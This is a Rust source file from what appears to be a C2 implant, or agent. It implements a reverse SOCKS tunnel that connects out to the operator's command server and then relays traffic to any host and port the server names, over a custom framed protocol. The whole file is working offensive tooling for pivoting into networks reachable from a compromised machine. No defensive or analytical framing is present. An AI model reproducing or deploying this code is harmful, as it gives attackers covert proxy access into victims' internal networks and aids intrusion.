#![allow(dead_code)]
/// Reverse SOCKS mux — agent dials C2's callback port outbound.
/// Frame protocol: 9-byte header [streamID:u32LE][type:u8][payloadLen:u32LE][payload]
/// SYN=1 (C2→agent: target "host:port"), DATA=2, FIN=3, OK=4, ERR=5

use std::io::{Read, Write};
use std::net::TcpStream;
use std::sync::{Arc, Mutex, OnceLock};
use std::sync::atomic::{AtomicBool, Ordering};
use std::collections::HashMap;

const RS_SYN:  u8 = 1;
const RS_DATA: u8 = 2;
const RS_FIN:  u8 = 3;
const RS_OK:   u8 = 4;
const RS_ERR:  u8 = 5;

static RSOCKS_STOP: AtomicBool = AtomicBool::new(true);
static RSOCKS_HANDLE: OnceLock<Mutex<Option<std::thread::JoinHandle<()>>>> = OnceLock::new();

fn rsocks_handle() -> std::sync::MutexGuard<'static, Option<std::thread::JoinHandle<()>>> {
    RSOCKS_HANDLE.get_or_init(|| Mutex::new(None)).lock().unwrap()
}

fn write_frame(c2: &Arc<Mutex<TcpStream>>, sid: u32, ft: u8, data: &[u8]) {
    let mut hdr = [0u8; 9];
    hdr[..4].copy_from_slice(&sid.to_le_bytes());
    hdr[4] = ft;
    hdr[5..9].copy_from_slice(&(data.len() as u32).to_le_bytes());
    let mut g = c2.lock().unwrap();
    let _ = g.write_all(&hdr);
    if !data.is_empty() { let _ = g.write_all(data); }
}

fn c2_host() -> String {
    let mut s = crate::config::SERVER_URL;
    if let Some(r) = s.strip_prefix("https://") { s = r; }
    else if let Some(r) = s.strip_prefix("http://") { s = r; }
    let s = if let Some(i) = s.find('/') { &s[..i] } else { s };
    if let Some(i) = s.rfind(':') { s[..i].to_string() } else { s.to_string() }
}

pub fn rsocks_start(callback_port: u16) -> String {
    let host = c2_host();
    let addr = format!("{}:{}", host, callback_port);
    let conn = match TcpStream::connect(&addr) {
        Ok(s) => s,
        Err(e) => return format!("[-] rsocks: connect {} failed: {}", addr, e),
    };
    let c2_write = Arc::new(Mutex::new(match conn.try_clone() {
        Ok(c) => c,
        Err(e) => return format!("[-] rsocks: clone failed: {}", e),
    }));
    let streams: Arc<Mutex<HashMap<u32, Arc<Mutex<TcpStream>>>>> =
        Arc::new(Mutex::new(HashMap::new()));
    RSOCKS_STOP.store(false, Ordering::SeqCst);
    let c2w = c2_write.clone();
    let st  = streams.clone();
    let handle = std::thread::spawn(move || {
        let mut c2r = conn;
        let mut hdr = [0u8; 9];
        while !RSOCKS_STOP.load(Ordering::SeqCst) {
            if c2r.read_exact(&mut hdr).is_err() { break; }
            let sid     = u32::from_le_bytes(hdr[..4].try_into().unwrap());
            let ft      = hdr[4];
            let pay_len = u32::from_le_bytes(hdr[5..9].try_into().unwrap()) as usize;
            let mut payload = vec![0u8; pay_len];
            if pay_len > 0 && c2r.read_exact(&mut payload).is_err() { break; }
            match ft {
                RS_SYN => {
                    let target = String::from_utf8_lossy(&payload).into_owned();
                    let st3  = st.clone();
                    let c2w3 = c2w.clone();
                    std::thread::spawn(move || {
                        match TcpStream::connect(&target) {
                            Ok(ts) => {
                                let ts_clone = match ts.try_clone() {
                                    Ok(c) => c,
                                    Err(_) => { write_frame(&c2w3, sid, RS_ERR, b"clone failed"); return; }
                                };
                                st3.lock().unwrap().insert(sid, Arc::new(Mutex::new(ts_clone)));
                                write_frame(&c2w3, sid, RS_OK, &[]);
                                let mut ts_read = ts;
                                let mut buf = vec![0u8; 32768];
                                loop {
                                    match ts_read.read(&mut buf) {
                                        Ok(0) | Err(_) => break,
                                        Ok(n) => write_frame(&c2w3, sid, RS_DATA, &buf[..n]),
                                    }
                                }
                                st3.lock().unwrap().remove(&sid);
                                write_frame(&c2w3, sid, RS_FIN, &[]);
                            }
                            Err(e) => write_frame(&c2w3, sid, RS_ERR, e.to_string().as_bytes()),
                        }
                    });
                }
                RS_DATA => {
                    if let Some(ts) = st.lock().unwrap().get(&sid) {
                        let _ = ts.lock().unwrap().write_all(&payload);
                    }
                }
                RS_FIN => { st.lock().unwrap().remove(&sid); }
                _ => {}
            }
        }
        RSOCKS_STOP.store(true, Ordering::SeqCst);
    });
    *rsocks_handle() = Some(handle);
    format!("[+] rsocks connected to {}", addr)
}

pub fn rsocks_stop() -> &'static str {
    if RSOCKS_STOP.load(Ordering::SeqCst) { return "[-] rsocks not running"; }
    RSOCKS_STOP.store(true, Ordering::SeqCst);
    let _ = rsocks_handle().take();
    "[+] rsocks stopped"
}
